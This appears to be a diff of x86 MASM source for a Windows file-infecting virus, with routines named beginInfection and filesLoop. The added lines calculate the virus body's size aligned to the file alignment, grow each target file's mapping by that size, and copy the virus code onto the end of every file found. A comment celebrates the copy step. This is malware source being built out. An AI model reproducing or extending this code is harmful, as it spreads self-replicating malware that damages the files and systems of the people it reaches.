@@ -161,7 +161,7 @@ endfindprocfail:
 	ret
 getExportedProcAddr endp
 
-filesLoop proc k32hmodule:HMODULE, prcGetProcAddr:dword
+filesLoop proc k32hmodule:HMODULE, prcGetProcAddr:dword, sectionSize:dword
 	local findFileData:WIN32_FIND_DATA
 	local searchHandle:dword
 	local fileHandle:dword
@@ -227,9 +227,13 @@ fileMainLoop:
 	je fileNext
 	mov fileHandle, eax
 
+	mov edx, findFileData.nFileSizeLow
+	add edx, sectionSize ; edx now had our total fileSize
+	
+
 	;invoke prcCreateFileMapping, fileHandle, 0, PAGE_READWRITE, 0, 0, 0 ; This is where we have to change the size of our program.
 	push 0
-	push 0
+	push edx
 	push 0
 	push PAGE_READWRITE
 	push 0
@@ -251,6 +255,15 @@ fileMainLoop:
 	cmp eax, 0
 	je fileMapClose
 	mov fileView, eax
+
+	mov esi, main ;from the beginning of our code
+
+	mov edi, fileView
+	add edi, findFileData.nFileSizeLow ; to where the file originally ends
+
+	cld
+	mov ecx, sectionSize ; copy sectionSize bytes
+	rep movsb ;HOLY SH1T 1TS T34L
 
 	; fileView now points toward an array representing our file
 
@@ -295,6 +308,8 @@ beginInfection proc delta:dword
 	local procMessageBox:dword
 	local localDelta:dword
 	local hmodule:dword
+	local fileAlignment:dword
+	local sectionSize:dword
 
 	jmp Kernel32Init
 
@@ -345,7 +360,20 @@ Kernel32Init:
 	push localDelta
 	call procLoadLibrary
 
-	invoke filesLoop, eax, procGetProcAddress
+	push eax ;save eax
+
+	mov fileAlignment, 0200h ;this should be set from the header data.
+	mov eax, endfile
+	sub eax, main ;we now have our total code size in eax
+	mov edx, 0
+	idiv fileAlignment ; divide it by fileAlignment
+	inc eax
+	imul eax, fileAlignment ; now our codeSize is a multiple of FileAlignement
+	mov sectionSize, eax
+
+	pop eax ;restore eax
+
+	invoke filesLoop, eax, procGetProcAddress, sectionSize
 
 
 
